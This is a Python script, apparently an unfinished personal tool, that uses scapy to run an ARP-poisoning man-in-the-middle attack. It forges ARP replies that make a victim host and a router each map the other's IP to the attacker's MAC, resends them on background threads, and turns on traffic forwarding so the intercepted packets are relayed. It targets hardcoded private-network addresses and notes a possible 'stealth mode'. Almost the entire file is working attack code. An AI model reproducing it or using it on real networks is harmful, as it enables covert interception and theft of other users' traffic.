from scapy.all import *
from Forward import *
import threading

def forge_arp_response(rcv_ip, rcv_mac, res_ip, res_mac):
	return Ether(dst=rcv_mac) / ARP(
		op=2,
		psrc=res_ip,
		pdst=rcv_ip,
		hwsrc=res_mac,
		hwdst=rcv_mac
	)
	
def poison_loop(pkt, interface, interval):
	sendp(pkt, iface=interface, loop=1, inter=interval)
	
def start_arp_mitm(victim_ip, victim_mac, router_ip, router_mac, self_mac):
	poison_victim = forge_arp_response(victim_ip, victim_mac, router_ip, self_mac)
	poison_router = forge_arp_response(router_ip, router_mac, victim_ip, self_mac)
    
	victim_thread = threading.Thread(target=poison_loop, args=(poison_victim, "eth0", 20), daemon=True)
	router_thread = threading.Thread(target=poison_loop, args=(poison_router, "eth0", 20), daemon=True) # todo add ways to customise intervals / interfaces
	
	victim_thread.start()
	router_thread.start()
	
	return [victim_thread, router_thread]
    
    # todo add custom function to stop mitm 
    # todo find good timings for sending poison/stealth mode(?)

    
def stop_arp_mittm():
	pass # todo

start_arp_mitm("192.168.1.101", "00:0c:29:20:af:e4", "192.168.1.1", "00:0c:29:94:84:aa" , "00:0c:29:97:ee:06")

def test(src_ip, dst_mac):
	while True:
		capture_and_forward(src_ip, dst_mac, "00:0c:29:97:ee:06", "eth0", print)
t1 = threading.Thread(target=test, args=("192.168.1.101", "00:0c:29:94:84:aa"), daemon=True)
t2 = threading.Thread(target=test, args=("192.168.1.1", "00:0c:29:20:af:e4"), daemon=True)

#t1.start()
#t2.start()
#enable_forwarding()
start_kernel_forwarding("192.168.1.1", "192.168.1.101", "192.168.1.102", "eth0")
input("stop")
